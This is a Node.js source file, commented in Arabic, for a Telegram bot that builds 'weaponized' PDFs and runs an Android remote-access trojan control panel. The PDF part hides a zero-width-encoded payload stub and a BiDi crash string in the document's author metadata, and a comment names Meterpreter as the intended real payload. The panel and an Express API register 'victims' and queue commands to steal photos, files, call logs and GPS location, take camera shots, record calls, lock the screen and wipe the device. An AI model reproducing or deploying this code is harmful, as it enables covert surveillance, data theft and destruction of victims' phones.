#!/usr/bin/env node
// ============================================================
// ARCHITECT TELEGRAM PDF WEAPONIZER + ANDROID RAT PANEL
// ============================================================
// "جاهز سيدي المطور" - الوحش الكامل
// ============================================================

const TelegramBot = require('node-telegram-bot-api');
const { PDFDocument, StandardFonts, rgb } = require('pdf-lib');
const sharp = require('sharp');
const fs = require('fs');
const path = require('path');
const express = require('express');

// ==============================================
// إعدادات البوت (من متغيرات البيئة)
// ==============================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = parseInt(process.env.ADMIN_ID);
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

if (!BOT_TOKEN || !ADMIN_ID) {
    console.error('❌ BOT_TOKEN and ADMIN_ID are required!');
    process.exit(1);
}

// ==============================================
// قاعدة بيانات الضحايا (في الذاكرة)
// ==============================================
const victims = new Map(); // victim_id -> { name, lastSeen, pendingCommands }

// ==============================================
// Zero-Width + BiDi Exploit Generator
// ==============================================
const ZW_MAP = {
    '0': '\u200B', // ZERO WIDTH SPACE
    '1': '\u200C', // ZERO WIDTH NON-JOINER
    'B': '\u200D', // ZERO WIDTH JOINER
    'E': '\uFEFF'  // ZERO WIDTH NO-BREAK SPACE
};

function generateCrashTrap() {
    const rlo = '\u202E'.repeat(4096);
    const lre = '\u202A'.repeat(2048);
    const pdf = '\u202C';
    return rlo + '['.repeat(1024) + lre + ']'.repeat(1024) + pdf;
}

function binaryToZeroWidth(data) {
    let bitStr = '';
    for (let i = 0; i < data.length; i++) {
        bitStr += data[i].toString(2).padStart(8, '0');
    }
    let encoded = '';
    for (const bit of bitStr) {
        encoded += ZW_MAP[bit];
    }
    return encoded + ZW_MAP['E'];
}

function generatePayloadStub() {
    // حمولة وهمية - في الإصدار الحقيقي تستبدل بـ Meterpreter
    return Buffer.from('DEADBEEF1337CAFE'.repeat(4), 'hex');
}

async function createWeaponizedPDF(imageBuffer) {
    // إنشاء PDF جديد
    const pdfDoc = await PDFDocument.create();
    const page = pdfDoc.addPage([595, 842]); // A4 size
    
    // تضمين الصورة
    let image;
    try {
        const pngImage = await sharp(imageBuffer).png().toBuffer();
        image = await pdfDoc.embedPng(pngImage);
    } catch {
        const jpgImage = await sharp(imageBuffer).jpeg().toBuffer();
        image = await pdfDoc.embedJpg(jpgImage);
    }
    
    // حساب الأبعاد
    const imgDims = image.scale(0.5);
    page.drawImage(image, {
        x: (595 - imgDims.width) / 2,
        y: (842 - imgDims.height) / 2,
        width: imgDims.width,
        height: imgDims.height,
    });
    
    // بناء الحمولة الخبيثة
    const stub = generatePayloadStub();
    const hiddenPayload = binaryToZeroWidth(stub);
    const crashTrap = generateCrashTrap();
    const maliciousUnicode = hiddenPayload + crashTrap;
    
    // إخفاء في Metadata
    pdfDoc.setAuthor(maliciousUnicode);
    pdfDoc.setTitle(`DOC_${Math.random().toString(36).substring(2, 8).toUpperCase()}`);
    pdfDoc.setSubject('Confidential');
    pdfDoc.setCreator('Adobe Acrobat');
    pdfDoc.setProducer('GhostWeaver v3.0');
    
    const pdfBytes = await pdfDoc.save();
    return Buffer.from(pdfBytes);
}

// ==============================================
// إنشاء البوت
// ==============================================
const bot = new TelegramBot(BOT_TOKEN, { webHook: { port: PORT } });

// ==============================================
// لوحة التحكم الرئيسية (Inline Keyboard)
// ==============================================
function getMainPanelKeyboard(victimId = null) {
    const prefix = victimId ? `${victimId}:` : '';
    
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: '📸 سحب الصور', callback_data: `${prefix}cmd_gallery` }],
                [{ text: '📁 سحب الملفات', callback_data: `${prefix}cmd_files` }],
                [{ text: '📱 اهتزاز', callback_data: `${prefix}cmd_vibrate` }],
                [{ text: '📷 تصوير أمامي', callback_data: `${prefix}cmd_camera_front` }],
                [{ text: '📷 تصوير خلفي', callback_data: `${prefix}cmd_camera_back` }],
                [{ text: '🎤 تسجيل مكالمة', callback_data: `${prefix}cmd_record_call` }],
                [{ text: '📍 الموقع GPS', callback_data: `${prefix}cmd_location` }],
                [{ text: '📞 سجل المكالمات', callback_data: `${prefix}cmd_call_log` }],
                [{ text: '💬 إشعار', callback_data: `${prefix}cmd_toast` }],
                [{ text: '🔒 قفل الشاشة', callback_data: `${prefix}cmd_lock` }],
                [{ text: '💣 فرمتة الجهاز', callback_data: `${prefix}cmd_format` }],
                [{ text: '🔄 تحديث', callback_data: `${prefix}refresh` }],
            ]
        }
    };
}

// ==============================================
// معالجة الأوامر
// ==============================================
bot.onText(/\/start/, (msg) => {
    if (msg.from.id !== ADMIN_ID) {
        return bot.sendMessage(msg.chat.id, '⛔ *غير مصرح بالوصول.*', { parse_mode: 'Markdown' });
    }
    
    bot.sendMessage(msg.chat.id, 
        '🖤 *جاهز سيدي المطور.*\n\n' +
        '⚡ *الوحش الكامل يعمل على Render*\n\n' +
        '📋 *الأوامر المتاحة:*\n' +
        '/start - تهيئة البوت\n' +
        '/panel - لوحة تحكم الوحش\n' +
        '/victims - عرض الضحايا المتصلين\n\n' +
        '📸 *أرسل أي صورة لتحويلها إلى PDF ملغوم.*',
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/panel/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    
    if (victims.size === 0) {
        return bot.sendMessage(msg.chat.id, '⚠️ *لا يوجد ضحايا متصلين حالياً.*\n\nأرسل PDF ملغوم للهدف أولاً.', { parse_mode: 'Markdown' });
    }
    
    let victimList = '👥 *الضحايا المتصلون:*\n\n';
    for (const [id, data] of victims) {
        victimList += `🆔 \`${id.substring(0, 8)}\` - ${data.name}\n`;
    }
    
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                ...Array.from(victims.keys()).map(id => ([
                    { text: `🎯 التحكم بـ ${id.substring(0, 8)}`, callback_data: `select:${id}` }
                ]))
            ]
        }
    };
    
    bot.sendMessage(msg.chat.id, victimList + '\n📋 *اختر ضحية للتحكم:*', { ...keyboard, parse_mode: 'Markdown' });
});

bot.onText(/\/victims/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    
    if (victims.size === 0) {
        return bot.sendMessage(msg.chat.id, '⚠️ لا يوجد ضحايا متصلين.');
    }
    
    let list = '👥 *الضحايا المتصلون:*\n\n';
    for (const [id, data] of victims) {
        list += `🆔 \`${id}\`\n📱 ${data.name}\n🕐 آخر اتصال: ${data.lastSeen}\n\n`;
    }
    
    bot.sendMessage(msg.chat.id, list, { parse_mode: 'Markdown' });
});

// ==============================================
// معالجة الصور (تحويل إلى PDF ملغوم)
// ==============================================
bot.on('photo', async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    
    const waitMsg = await bot.sendMessage(msg.chat.id, '🔄 *جاري بناء PDF الملغوم...*', { parse_mode: 'Markdown' });
    
    try {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        
        const response = await fetch(fileUrl);
        const imageBuffer = Buffer.from(await response.arrayBuffer());
        
        const pdfBuffer = await createWeaponizedPDF(imageBuffer);
        
        await bot.sendDocument(msg.chat.id, pdfBuffer, {
            filename: `Document_${Math.random().toString(36).substring(2, 8).toUpperCase()}.pdf`,
            caption: '💣 *PDF ملغوم جاهز.*\n\n⚠️ *للاستخدام الأمني المصرح به فقط.*\n\n📊 *معلومات تقنية:*\n• Zero-Width Payload: نشط\n• BiDi Crash Trap: نشط\n• السيرفر: Render Cloud',
            parse_mode: 'Markdown'
        });
        
        await bot.deleteMessage(msg.chat.id, waitMsg.message_id);
        console.log(`✅ PDF sent to admin`);
        
    } catch (error) {
        await bot.editMessageText(`❌ *خطأ:*\n\`${error.message}\``, {
            chat_id: msg.chat.id,
            message_id: waitMsg.message_id,
            parse_mode: 'Markdown'
        });
        console.error('Error:', error);
    }
});

// ==============================================
// معالجة الأزرار (Callback Query)
// ==============================================
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    
    await bot.answerCallbackQuery(query.id);
    
    // اختيار ضحية
    if (data.startsWith('select:')) {
        const victimId = data.split(':')[1];
        const victim = victims.get(victimId);
        
        if (!victim) {
            return bot.editMessageText('⚠️ الضحية غير متصل حالياً.', {
                chat_id: chatId,
                message_id: query.message.message_id
            });
        }
        
        return bot.editMessageText(`🎯 *التحكم بالضحية:* \`${victimId.substring(0, 8)}\`\n📱 ${victim.name}\n\n📋 *اختر أمراً:*`, {
            chat_id: chatId,
            message_id: query.message.message_id,
            ...getMainPanelKeyboard(victimId),
            parse_mode: 'Markdown'
        });
    }
    
    // تحديث
    if (data.endsWith('refresh')) {
        const victimId = data.split(':')[0];
        const victim = victims.get(victimId);
        
        if (!victim) {
            return bot.editMessageText('⚠️ الضحية غير متصل حالياً.', {
                chat_id: chatId,
                message_id: query.message.message_id
            });
        }
        
        return bot.editMessageText(`🎯 *التحكم بالضحية:* \`${victimId.substring(0, 8)}\`\n📱 ${victim.name}\n🕐 آخر تحديث: ${new Date().toLocaleString()}\n\n📋 *اختر أمراً:*`, {
            chat_id: chatId,
            message_id: query.message.message_id,
            ...getMainPanelKeyboard(victimId),
            parse_mode: 'Markdown'
        });
    }
    
    // تنفيذ الأوامر
    const [victimId, command] = data.split(':');
    const victim = victims.get(victimId);
    
    if (!victim) {
        return bot.editMessageText('⚠️ الضحية غير متصل حالياً.', {
            chat_id: chatId,
            message_id: query.message.message_id
        });
    }
    
    // تخزين الأمر في قائمة انتظار الضحية
    if (!victim.pendingCommands) victim.pendingCommands = [];
    victim.pendingCommands.push(command);
    
    const commandNames = {
        'cmd_gallery': '📸 سحب الصور',
        'cmd_files': '📁 سحب الملفات',
        'cmd_vibrate': '📱 اهتزاز',
        'cmd_camera_front': '📷 تصوير أمامي',
        'cmd_camera_back': '📷 تصوير خلفي',
        'cmd_record_call': '🎤 تسجيل مكالمة',
        'cmd_location': '📍 الموقع GPS',
        'cmd_call_log': '📞 سجل المكالمات',
        'cmd_toast': '💬 إشعار',
        'cmd_lock': '🔒 قفل الشاشة',
        'cmd_format': '💣 فرمتة الجهاز'
    };
    
    await bot.editMessageText(`✅ *تم إرسال الأمر:* ${commandNames[command] || command}\n\n⏳ في انتظار تنفيذ الضحية...`, {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown'
    });
    
    console.log(`📤 Command sent to ${victimId}: ${command}`);
});

// ==============================================
// API للضحايا (RAT Agent)
// ==============================================
const app = express();
app.use(express.json());

// تسجيل ضحية جديدة
app.post('/api/register', (req, res) => {
    const { device_id, device_name } = req.body;
    
    victims.set(device_id, {
        name: device_name,
        lastSeen: new Date().toLocaleString(),
        pendingCommands: []
    });
    
    console.log(`🟢 New victim: ${device_name} (${device_id})`);
    
    // إشعار الأدمن
    bot.sendMessage(ADMIN_ID, `🟢 *جهاز جديد متصل*\n\n📱 *الجهاز:* ${device_name}\n🆔 *ID:* \`${device_id}\``, { parse_mode: 'Markdown' });
    
    res.json({ status: 'ok' });
});

// استطلاع الأوامر (Polling)
app.post('/api/poll', (req, res) => {
    const { device_id } = req.body;
    const victim = victims.get(device_id);
    
    if (!victim) {
        return res.json({ commands: [] });
    }
    
    victim.lastSeen = new Date().toLocaleString();
    
    const commands = victim.pendingCommands || [];
    victim.pendingCommands = [];
    
    res.json({ commands });
});

// رفع نتائج الأوامر
app.post('/api/upload', async (req, res) => {
    const { device_id, command, result } = req.body;
    
    console.log(`📥 Result from ${device_id}: ${command}`);
    
    if (command === 'cmd_gallery' && result) {
        // إرسال الصور للأدمن
        for (const photo of result) {
            try {
                await bot.sendPhoto(ADMIN_ID, Buffer.from(photo, 'base64'), {
                    caption: `📸 من ${device_id.substring(0, 8)}`
                });
            } catch (e) {
                console.error('Failed to send photo:', e);
            }
        }
    }
    
    if (command === 'cmd_files' && result) {
        for (const file of result) {
            try {
                await bot.sendDocument(ADMIN_ID, Buffer.from(file.data, 'base64'), {
                    caption: `📁 ${file.name} من ${device_id.substring(0, 8)}`,
                    filename: file.name
                });
            } catch (e) {
                console.error('Failed to send file:', e);
            }
        }
    }
    
    if (command === 'cmd_call_log' && result) {
        await bot.sendMessage(ADMIN_ID, `📞 *سجل مكالمات ${device_id.substring(0, 8)}:*\n\n\`\`\`\n${result}\n\`\`\``, { parse_mode: 'Markdown' });
    }
    
    if (command === 'cmd_location' && result) {
        await bot.sendLocation(ADMIN_ID, result.lat, result.lng);
        await bot.sendMessage(ADMIN_ID, `📍 موقع ${device_id.substring(0, 8)}`);
    }
    
    res.json({ status: 'ok' });
});

// ==============================================
// تشغيل السيرفر
// ==============================================
if (WEBHOOK_URL) {
    bot.setWebHook(`${WEBHOOK_URL}/bot${BOT_TOKEN}`);
    console.log(`✅ Webhook set to: ${WEBHOOK_URL}/bot${BOT_TOKEN}`);
}

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🖤 جاهز سيدي المطور.`);
});

// ==============================================
// معالجة الإشارات
// ==============================================
process.on('SIGINT', () => {
    console.log('👋 Shutting down...');
    process.exit(0);
});
